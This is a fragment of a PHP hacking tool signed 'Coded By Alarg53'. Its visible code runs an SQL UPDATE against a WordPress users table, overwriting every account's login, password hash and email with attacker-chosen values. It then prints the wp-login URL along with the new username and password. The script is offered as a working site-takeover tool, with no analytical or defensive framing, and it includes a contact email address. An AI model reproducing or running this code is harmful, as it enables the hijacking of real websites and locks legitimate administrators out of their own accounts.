...
<body>
<center>
<div id="gter">Coded By Alarg53</div>
<form method="post">
...
#####
$query2 = mysqli_query($connect,"update ".$prefix."users set user_login='admin',user_pass='728984375fe60420fbba826bd966939d',user_email='rajalacur@gmail.com'");
if($query2){
	echo "<center><span class=f>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url</a><br><br>UserName : Alarg53<br><br>Password : Alarg53<br><br></span></center>";
}
}
}
}
